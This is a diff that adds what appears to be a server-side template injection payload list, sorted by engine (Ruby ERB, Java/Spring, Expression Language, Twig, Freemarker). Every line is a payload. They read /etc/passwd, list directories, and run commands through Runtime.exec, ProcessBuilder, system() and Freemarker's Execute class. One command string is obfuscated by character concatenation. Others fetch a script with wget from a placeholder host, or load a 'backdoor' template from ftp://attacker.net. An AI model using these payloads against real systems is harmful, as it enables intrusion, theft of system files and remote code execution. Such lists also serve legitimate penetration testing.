@@ -1,0 +1,61 @@
+Ruby
+<%= 7 * 7 %>
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+
+Java
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+Expression Language EL
+${1+1} 
+#{1+1}
+''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
+''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
+#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
+#{session.getAttribute("rtc").setAccessible(true)}
+#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+${request.getAttribute("c").add("cmd.exe")}
+${request.getAttribute("c").add("/k")}
+${request.getAttribute("c").add("ping x.x.x.x")}
+${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
+${request.getAttribute("a")}
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
+
+Twig
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+
+Freemarker
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+
